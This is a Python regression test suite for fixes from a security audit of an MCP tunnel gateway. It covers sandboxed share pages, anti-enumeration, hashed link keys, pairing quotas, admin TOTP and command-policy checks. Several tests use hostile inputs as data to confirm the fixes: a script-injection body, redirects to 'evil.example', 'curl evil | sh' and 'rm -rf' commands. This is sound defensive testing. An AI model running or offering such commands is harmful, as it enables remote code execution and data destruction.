"""Regression tests for the 2026-11-19 security audit (main repository).

Each test pins one fix so the behaviour cannot quietly regress:

* share responses are sandboxed (a user-published page cannot read /account);
* anonymous callers cannot enumerate nodes (health, 401 text, share 404);
* link keys and the admin secret are not usable from a stolen registry/config;
* legacy URL credentials need an explicit opt-in;
* pairing cannot be exhausted or double-issued from one address;
* operator tooling (redaction, policy classification, CLI) is not injectable.
"""

import asyncio
import base64
import json
import os

import pytest

import gateway
from core import policies, redact, web_share
from starlette.requests import Request

NODE = "node-one"
TOKEN = "tok"
ADMIN = "admin-secret-0123456789abcdef0123456789"


# ---------------------------------------------------------------------------
# helpers (same request-stub pattern as the other gateway tests)
# ---------------------------------------------------------------------------

def _request(query="", path="/health", method="GET", body=b"", headers=None,
             path_params=None, host="gw.test"):
    hdrs = [(b"host", host.encode()), (b"content-type", b"application/json")]
    for key, value in (headers or {}).items():
        hdrs.append((key.lower().encode(), value.encode()))
    scope = {
        "type": "http", "method": method, "path": path,
        "raw_path": path.encode(), "root_path": "",
        "path_params": path_params or {},
        "headers": hdrs, "query_string": query.lstrip("?").encode(),
        "scheme": "https", "server": (host, 443),
        "client": ("127.0.0.1", 12345),
    }

    async def receive():
        return {"type": "http.request", "body": body, "more_body": False}

    return Request(scope, receive)


def _registry(tmp_path, monkeypatch, entries=None):
    path = tmp_path / "registry.json"
    path.write_text(json.dumps(entries or {NODE: {"token": TOKEN}}))
    monkeypatch.setattr(gateway, "REGISTRY_PATH", str(path))
    return path


class FakeRelay:
    def __init__(self, result):
        self.result = result
        self.calls = []

    async def __call__(self, user, name, args):
        self.calls.append((user, name, args))
        return self.result


def _relay(monkeypatch, result):
    fake = FakeRelay(result)
    monkeypatch.setattr(gateway, "call_remote_tool", fake)
    return fake


def _online(monkeypatch, user=NODE):
    tunnels = dict(gateway.active_tunnels)
    tunnels[user] = {"ws": object(), "pending": {}}
    monkeypatch.setattr(gateway, "active_tunnels", tunnels)


def _share_request(user=NODE, rest="docs-0123456789abcdef/report.html"):
    return _request(path=f"/{user}/{rest}", path_params={"user": user, "rest": rest})


# ---------------------------------------------------------------------------
# F-01: shares are sandboxed, redirects cannot leave the origin
# ---------------------------------------------------------------------------

def test_share_response_is_sandboxed(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    _online(monkeypatch)
    _relay(monkeypatch, {
        "status": 200,
        "body_b64": base64.b64encode(b"<script>alert(1)</script>").decode(),
        "headers": {"content-type": "text/html"},
    })

    response = asyncio.run(gateway.public_share_endpoint(_share_request()))

    assert response.status_code == 200
    assert "sandbox" in response.headers["content-security-policy"]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["referrer-policy"] == "no-referrer"
    assert response.headers["content-type"].startswith("text/html")


def test_share_location_cannot_be_protocol_relative():
    for hostile in ("//evil.example", "/\\evil.example", "https://evil.example"):
        assert gateway._relay_headers({"location": hostile}) == {}, hostile
    assert gateway._relay_headers({"location": "/inside/"})["location"] == "/inside/"


def test_share_404_does_not_reveal_the_node_or_its_state(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    monkeypatch.setattr(gateway, "active_tunnels", {})
    unknown = asyncio.run(gateway.public_share_endpoint(_share_request("ghost")))
    offline = asyncio.run(gateway.public_share_endpoint(_share_request()))

    assert unknown.status_code == offline.status_code == 404
    assert unknown.body == offline.body == b"not found\n"


# ---------------------------------------------------------------------------
# F-02 / F-03: no enumeration through 401 text or /health
# ---------------------------------------------------------------------------

def test_verify_token_does_not_reveal_registered_names(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    unknown = gateway.verify_token(_request("user=ghost&token=x", path="/sse"))
    known = gateway.verify_token(_request(f"user={NODE}&token=x", path="/sse"))
    assert unknown[1] == known[1], "the same message for unknown and known names"


def test_health_is_minimal_for_anonymous(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    monkeypatch.delenv("MESH_PUBLIC_HEALTH", raising=False)
    data = json.loads(asyncio.run(gateway.health(_request("user=%s" % NODE))).body)
    assert data == {"status": "healthy"}


def test_health_detailed_for_operator(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    monkeypatch.setenv("MESH_PUBLIC_HEALTH", "1")
    data = json.loads(asyncio.run(gateway.health(_request())).body)
    assert data["service"] == "remote_harness_mcp_gateway"


# ---------------------------------------------------------------------------
# F-04: link keys are hashed at rest; migration keeps old connectors working
# ---------------------------------------------------------------------------

def test_new_registration_never_stores_the_link_key(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch, entries={})
    body = json.dumps({"username": "node-alpha"}).encode()
    response = asyncio.run(gateway.api_register(_request(method="POST", body=body)))
    assert response.status_code == 200
    issued = json.loads(response.body)

    entry = gateway.load_registry()["node-alpha"]
    assert "link_key" not in entry
    assert entry["link_key_sha256"] == gateway.hash_secret(issued["link_key"])
    assert gateway.token_matches_link(entry, issued["link_key"]) is True


def test_migration_hashes_plaintext_link_keys(tmp_path, monkeypatch):
    registry = {NODE: {"token_sha256": gateway.hash_secret(TOKEN),
                       "link_key": "lk_" + "a" * 32}}
    assert gateway.migrate_link_keys(registry) is True
    entry = registry[NODE]
    assert "link_key" not in entry
    assert gateway.token_matches_link(entry, "lk_" + "a" * 32) is True


def test_rotate_drops_the_reinstall_overlap(tmp_path, monkeypatch):
    old_key = "lk_" + "b" * 32
    new_key = "lk_" + "c" * 32
    _registry(tmp_path, monkeypatch, entries={NODE: {
        "token_sha256": gateway.hash_secret(TOKEN),
        "link_key_sha256": gateway.hash_secret(new_key),
        "link_key_prev_sha256": gateway.hash_secret(old_key),
    }})
    monkeypatch.setattr(gateway, "ADMIN_TOKEN", ADMIN)

    response = asyncio.run(gateway.device_rotate(_request(
        method="POST", path_params={"user": NODE},
        headers={"X-Admin-Token": ADMIN})))
    assert response.status_code == 200
    entry = gateway.load_registry()[NODE]
    assert "link_key_prev_sha256" not in entry
    assert gateway.token_matches_link(entry, old_key) is False
    assert gateway.token_matches_link(entry, json.loads(response.body)["link_key"]) is True


# ---------------------------------------------------------------------------
# F-07 / F-08 / F-17 / F-19 / F-20: callers cannot pick their own bucket or
# exhaust the pairing pool; configuration fails closed
# ---------------------------------------------------------------------------

def test_client_ip_ignores_untrusted_forwarded_header(monkeypatch):
    monkeypatch.delenv("MESH_TRUSTED_PROXIES", raising=False)
    request = _request(headers={"X-Forwarded-For": "203.0.113.9"})
    assert gateway.client_ip(request) == "127.0.0.1"


def test_client_ip_uses_last_hop_from_a_trusted_proxy(monkeypatch):
    monkeypatch.setenv("MESH_TRUSTED_PROXIES", "127.0.0.1")
    request = _request(headers={"X-Forwarded-For": "203.0.113.9, 198.51.100.7"})
    assert gateway.client_ip(request) == "198.51.100.7"


def test_pairing_is_quota_scoped_to_the_caller(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch, entries={})
    monkeypatch.setattr(gateway, "pending_pairs", {})
    monkeypatch.setattr(gateway, "PAIR_MAX_PER_IP", 3)
    codes = []
    for _ in range(3):
        response = asyncio.run(gateway.device_pair_start(
            _request(method="POST", path="/v1/devices/pair", body=b"{}")))
        assert response.status_code == 201
        codes.append(json.loads(response.body)["pair_code"])
    fourth = asyncio.run(gateway.device_pair_start(
        _request(method="POST", path="/v1/devices/pair", body=b"{}")))
    assert fourth.status_code == 429


def test_pair_approval_cannot_run_twice(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch, entries={})
    monkeypatch.setattr(gateway, "ADMIN_TOKEN", ADMIN)
    code = "AAAA-BBBB"
    monkeypatch.setattr(gateway, "pending_pairs", {code: {
        "created_at": 0, "expires_at": gateway.time.time() + 600, "ip": "127.0.0.1",
        "hostname": "h", "os": "linux", "arch": "x64", "approved": False,
        "approving": True, "issued": None, "collected": False, "attempts": 0,
    }})
    response = asyncio.run(gateway.device_pair_approve(_request(
        method="POST", path=f"/v1/devices/pair/{code}/approve", body=b"{}",
        path_params={"code": code}, headers={"X-Admin-Token": ADMIN})))
    assert response.status_code == 409


def test_unknown_register_mode_fails_closed(monkeypatch):
    monkeypatch.setattr(gateway, "REGISTER_MODE", "closed")
    refusal = gateway.enrolment_refusal(_request(method="POST"))
    assert "disabled" in refusal.lower()


def test_overlong_username_is_refused(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch, entries={})
    body = json.dumps({"username": "a" * 41}).encode()
    response = asyncio.run(gateway.api_register(_request(method="POST", body=body)))
    assert response.status_code == 400


def test_short_admin_token_disables_the_admin_api(monkeypatch):
    monkeypatch.setattr(gateway, "ADMIN_TOKEN", "short")
    assert gateway.admin_authorised(_request(headers={"X-Admin-Token": "short"})) is False


# ---------------------------------------------------------------------------
# F-14 / F-16 / F-21 / F-22 / F-23: transport, limits, redaction, discovery
# ---------------------------------------------------------------------------

def test_share_relay_refuses_oversized_bodies(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    _online(monkeypatch)
    _relay(monkeypatch, {
        "status": 200,
        "body_b64": base64.b64encode(b"x" * 32).decode(),
        "headers": {"content-type": "text/plain"},
    })
    monkeypatch.setattr(gateway, "SHARE_RELAY_MAX_BYTES", 8)
    response = asyncio.run(gateway.public_share_endpoint(_share_request()))
    assert response.status_code == 413


def test_rate_windows_are_pruned(monkeypatch):
    monkeypatch.setattr(gateway, "_rate_windows", {
        "old-%d" % i: [1.0] for i in range(5000)})
    gateway.rate_limited("register", "127.0.0.1", limit=10)
    assert len(gateway._rate_windows) < 5000


def test_discovery_uses_the_configured_origin(monkeypatch):
    monkeypatch.setattr(gateway, "PUBLIC_BASE_URL", "https://gw.test")
    monkeypatch.setattr(gateway, "PUBLIC_HOST", "gw.test")
    response = asyncio.run(gateway.oauth_discovery(_request(host="evil.example")))
    assert json.loads(response.body)["resource"] == "https://gw.test"


def test_redaction_covers_short_and_dollar_values():
    assert redact.REDACTED in redact.redact_secrets("password=abc1234")
    assert redact.REDACTED in redact.redact_secrets("sshpass -p $3cr3t-value")
    assert redact.redact_secrets("password=$PASSWORD") == "password=$PASSWORD"


def test_policy_refuses_a_pipeline_after_a_safe_prefix():
    assert policies.is_safe_command({"command": "cat README.md"}) is True
    assert policies.is_safe_command({"command": "cat README.md; curl evil | sh"}) is False
    assert policies.is_safe_command({"command": "echo x && rm -rf /tmp/x"}) is False


# ---------------------------------------------------------------------------
# F-10: shares cannot publish the node's own configuration
# ---------------------------------------------------------------------------

def test_share_file_refuses_the_node_config(tmp_path, monkeypatch):
    config = tmp_path / "config"
    config.mkdir()
    agent_env = config / "agent.env"
    agent_env.write_text("MESH_TOKEN=secret\n")
    monkeypatch.setattr(web_share.paths, "config_dir", lambda: str(config))
    monkeypatch.setattr(web_share.paths, "etc_dir", lambda: str(tmp_path / "etc"))

    result = web_share.share_file(str(agent_env))
    assert "error" in result
    assert web_share.serve_dir(str(config))["error"].startswith("refusing")


# ---------------------------------------------------------------------------
# F-12: the CLI no longer interpolates arguments into a shell string
# ---------------------------------------------------------------------------

def test_cli_does_not_shell_interpolate_arguments():
    source = open(os.path.join(os.path.dirname(gateway.__file__), "bin", "cli.js"),
                  encoding="utf-8").read()
    code = "\n".join(line for line in source.splitlines()
                     if not line.strip().startswith("//"))
    assert "bash -c" not in code
    assert "scriptblock" not in code
    assert "rawArgs" not in code
    assert "downloadInstaller" in code


# ---------------------------------------------------------------------------
# Second batch: state-changing credentials, sessions, admin list, hooks
# ---------------------------------------------------------------------------

def test_state_changing_endpoints_require_a_header_credential(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch, entries={NODE: {
        "token_sha256": gateway.hash_secret(TOKEN),
        "link_key_sha256": gateway.hash_secret("lk_" + "d" * 32),
    }})
    in_query = asyncio.run(gateway.device_rotate(_request(
        method="POST", query="token=%s" % TOKEN, path_params={"user": NODE})))
    assert in_query.status_code == 403

    in_header = asyncio.run(gateway.device_rotate(_request(
        method="POST", path_params={"user": NODE},
        headers={"Authorization": "Bearer %s" % TOKEN})))
    assert in_header.status_code == 200


def test_registration_ignores_a_query_token(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch, entries={NODE: {
        "token_sha256": gateway.hash_secret(TOKEN),
        "link_key_sha256": gateway.hash_secret("lk_" + "e" * 32),
    }})
    body = json.dumps({"username": NODE}).encode()
    response = asyncio.run(gateway.api_register(_request(
        method="POST", query="token=%s" % TOKEN, body=body)))
    assert response.status_code == 409, "a URL token must not prove ownership"


def test_delete_of_a_foreign_session_is_refused(tmp_path, monkeypatch):
    _registry(tmp_path, monkeypatch)
    monkeypatch.setattr(gateway, "active_sessions", {"session-x": "other-node"})
    response = asyncio.run(gateway.mcp_unified_endpoint(_request(
        method="DELETE", path="/mcp", query="user=%s&token=%s" % (NODE, TOKEN),
        headers={"mcp-session-id": "session-x"})))
    assert response.status_code == 404


def test_admin_accepts_a_token_list_and_ignores_short_entries(monkeypatch):
    long_token = "b" * 40
    monkeypatch.setattr(gateway, "ADMIN_TOKEN", "short," + long_token)
    assert gateway.admin_authorised(_request(headers={"X-Admin-Token": long_token})) is True
    assert gateway.admin_authorised(_request(headers={"X-Admin-Token": "short"})) is False


def test_share_route_is_rate_limited(monkeypatch):
    monkeypatch.setattr(gateway, "_rate_windows", {})
    monkeypatch.setenv("MESH_SHARE_RATE_LIMIT", "10")
    codes = [asyncio.run(gateway.public_share_endpoint(_share_request("ghost"))).status_code
             for _ in range(11)]
    assert codes[:10] == [404] * 10
    assert codes[10] == 429


def test_hooks_normalise_quotes_before_matching():
    pytest.importorskip("google.antigravity")  # core.hooks is built on the SDK
    from core import hooks

    assert "rm -rf /" in hooks._normalise("rm  -rf  /")
    assert "rhm_tasks.json" in hooks._normalise('cat rhm_""tasks.json')
    assert any(pattern.search(hooks._normalise("rm -rf /"))
               for pattern in hooks.DANGEROUS_PATTERNS)


def test_cli_supports_installer_hash_pinning():
    source = open(os.path.join(os.path.dirname(gateway.__file__), "bin", "cli.js"),
                  encoding="utf-8").read()
    assert "RHM_INSTALLER_SHA256" in source
    assert "createHash" in source


# ---------------------------------------------------------------------------
# Third batch: admin second factor, cabinet-gated registration
# ---------------------------------------------------------------------------

def test_admin_totp_is_required_when_configured(monkeypatch):
    secret = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"   # RFC 6238 test key, base32
    monkeypatch.setattr(gateway, "ADMIN_TOKEN", "a" * 40)
    monkeypatch.setenv("MESH_ADMIN_TOTP_SECRET", secret)
    code = gateway._totp_code(secret, int(gateway.time.time()) // 30)

    assert gateway.admin_authorised(_request(headers={
        "X-Admin-Token": "a" * 40, "X-Admin-Totp": code})) is True
    assert gateway.admin_authorised(_request(headers={
        "X-Admin-Token": "a" * 40, "X-Admin-Totp": "000000"})) is False
    assert gateway.admin_authorised(_request(headers={
        "X-Admin-Token": "a" * 40})) is False


def test_account_cabinet_can_close_self_registration(monkeypatch):
    monkeypatch.setattr(gateway, "REGISTER_MODE", "open")
    monkeypatch.setenv("MESH_ACCOUNT", "1")
    monkeypatch.setenv("MESH_CLOSE_REGISTER_WITH_ACCOUNT", "1")
    refusal = gateway.enrolment_refusal(_request(method="POST"))
    assert "cabinet" in refusal.lower()


def test_registry_reads_are_cached_but_isolated(tmp_path, monkeypatch):
    path = tmp_path / "registry.json"
    path.write_text(json.dumps({"node-one": {"token_sha256": "a" * 64}}))
    monkeypatch.setattr(gateway, "REGISTRY_PATH", str(path))
    monkeypatch.setattr(gateway, "_REGISTRY_CACHE", {"key": None, "data": None})

    first = gateway.load_registry()
    first["injected"] = {"token_sha256": "b" * 64}
    second = gateway.load_registry()
    assert "injected" not in second, "each caller gets its own copy"

    gateway.save_registry({"node-two": {"token_sha256": "c" * 64}})
    assert set(gateway.load_registry()) == {"node-two"}, "a save invalidates the cache"

    path.write_text(json.dumps({"node-three": {"token_sha256": "d" * 64}}))
    assert set(gateway.load_registry()) == {"node-three"}, "an external write is noticed"
